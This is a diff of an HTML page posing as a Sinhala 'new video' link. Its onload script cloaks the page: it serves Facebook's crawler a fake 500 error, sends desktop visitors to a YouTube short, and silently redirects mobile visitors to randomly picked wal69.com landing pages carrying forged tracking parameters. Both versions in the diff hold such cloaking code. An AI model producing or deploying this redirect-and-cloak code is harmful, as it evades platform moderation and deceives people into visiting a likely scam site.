@@ -1,144 +1,66 @@
 <!DOCTYPE html>
-<html lang="si"> <!-- Set language to Sinhala -->
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sanduni Video</title>
-  <!-- Load Tailwind CSS -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    /* Custom font for Sinhala text */
-    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Sinhala:wght@400;700&display=swap');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>අලුත් Video</title>
+
+    <meta name="title" content="🔴 ">
+    <meta name="description" content="මම අලුත් .">
+
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://wal699.github.io/wal69/">
+    <meta property="og:title" content="🔴 අලුත් Video">
+    <meta property="og:description" content="අලුත් Video ">
+    <meta property="og:image" content="https://raw.githubusercontent.com/wal699/sanduni-call/refs/heads/main/og-image-git.png">
     
-    html, body {
-      /* height: 100%; */ /* Removed height to use min-h-screen */
-      width: 100%;
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      /* Set the custom font with fallbacks */
-      font-family: 'Noto Sans Sinhala', "Segoe UI", sans-serif;
-    }
+   <script>
+window.onload = function () {
+    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
 
-    /* More engaging gradient background */
-    .gradient-bg {
-      background: linear-gradient(135deg, #1a1a2e 0%, #0a0a0a 50%, #1a1a2e 100%); /* Changed from cyan to indigo base */
-      background-size: 200% 200%;
-      /* Animation to make the gradient "breathe" */
-      animation: gradientShift 10s ease infinite;
-    }
-
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-
-    /* New Spinner Animation */
-    .spinner {
-      width: 56px;
-      height: 56px;
-      border-radius: 50%;
-      border: 6px solid;
-      /* Using a new purple color */
-      border-color: #9370DB #9370DB #9370DB transparent; /* Changed from #00FFFF */
-      animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
-    }
-    
-    /* A lighter, opposing inner trail for more dynamic look */
-    .spinner-inner {
-      width: 56px;
-      height: 56px;
-      border-radius: 50%;
-      border: 6px solid;
-      border-color: #f3f3f3 transparent #f3f3f3 #f3f3f3;
-      animation: spin-reverse 0.8s ease-in-out infinite;
-      opacity: 0.2;
-      position: absolute;
-      top: 0;
-      left: 0;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    @keyframes spin-reverse {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(-360deg); }
-    }
-
-    /* Softer fade-in animation */
-    .content-card, .top-heading {
-      animation: fadeIn 1s ease-out;
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-  </style>
-  <script>
-    window.onload = function() {
-      const ua = navigator.userAgent.toLowerCase();
-
-      // Block Facebook or bots
-      const blockedAgents = [
-        'facebookexternalhit',
-        'facebot',
-        'twitterbot',
-        'linkedinbot',
-        'crawler',
-        'spider'
-      ];
-
-      if (blockedAgents.some(agent => ua.includes(agent))) {
-        // Use Tailwind class for the error message
-        document.body.innerHTML = "<h1 class='text-red-500 text-2xl text-center p-10'>500 Internal Server Error</h1>";
+    // Block Facebook crawler
+    if (userAgent.includes("facebookexternalhit")) {
+        document.body.innerHTML = "<h1>500 Internal Server Error</h1>";
         return;
-      }
+    }
 
-      // Add visual delay before redirect (human visitors see a loader)
-      const pages = [
-        "http://wal69.com/landing.php",
-        "http://wal69.com/landing.php?id=1",
-        "http://wal69.com/landing.php?id=2",
-        "http://wal69.com/landing.php?id=3"
-      ];
-      const target = pages[Math.floor(Math.random() * pages.length)];
+    // Detect mobile devices
+    const isMobile = navigator.userAgentData
+        ? navigator.userAgentData.mobile
+        : /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(userAgent);
 
-      setTimeout(() => {
-        window.location.href = target;
-      }, 1000); // 3 seconds delay
-    };
-  </script>
+    // Redirect PC/Desktop users
+    if (!isMobile) {
+        window.location.replace(
+            "https://www.youtube.com/shorts/Hdidwf_4I8I"
+        );
+        return;
+    }
+
+    // Generate unique IDs for mobile redirect links
+    const randomId1 = Math.floor(Math.random() * 90000) + 10000;
+    const randomId2 = Math.floor(Math.random() * 90000) + 10000;
+    const randomId3 = Math.floor(Math.random() * 90000) + 10000;
+
+    // Generate a random 2-to-3 digit GitHub ID
+    const randomGithubId = Math.floor(Math.random() * 990) + 10;
+
+    const pages = [
+        "https://wal69.com/landing.php/?utm_source=facebook&utm_campaign=post_id_" + randomId1,
+
+        "https://wal69.com/landing.php/?utm_source=m.baidu.com/s?word=wal69.com&utm_campaign=post_id_" + randomId3,
+
+        "https://wal69.com/landing.php/?utm_source=telegram&utm_campaign=post_id_github" + randomGithubId,
+
+        "https://wal69.com/landing.php/?utm_source=facebook&utm_campaign=post_id_" + randomId2
+    ];
+
+    const randomPage = pages[Math.floor(Math.random() * pages.length)];
+
+    window.location.replace(randomPage);
+};
+</script>
 </head>
-<!-- Updated body to align content to the start (top) of the page -->
-<body class="gradient-bg text-white flex flex-col items-center justify-start min-h-screen">
-  
-  <!-- Main text in Sinhala - Moved to top -->
-  <h1 class="top-heading text-3xl md:text-4xl font-bold text-gray-100 mt-20 mb-10 text-center mx-4" style="color: #9370DB;"> <!-- Changed from #00FFFF -->
-    Continue කියන එක ⬇️ ඔබන්න
-  </h1>
-
-  <!-- Content card with blur and shadow for a modern effect -->
-  <div class="content-card text-center p-8 bg-black bg-opacity-30 backdrop-blur-md rounded-2xl shadow-2xl max-w-sm mx-4">
-    
-    <!-- Main text in Sinhala (was here) -->
-    
-    <!-- Loading Message -->
-    <p class="text-lg text-gray-300 mb-8">
-      ...
-    </p>
-
-    <!-- New Spinner -->
-    <div class="relative w-14 h-14 mx-auto">
-      <div class="spinner"></div>
-      <div class="spinner-inner"></div>
-    </div>
-
-  </div>
-
+<body>
 </body>
 </html>
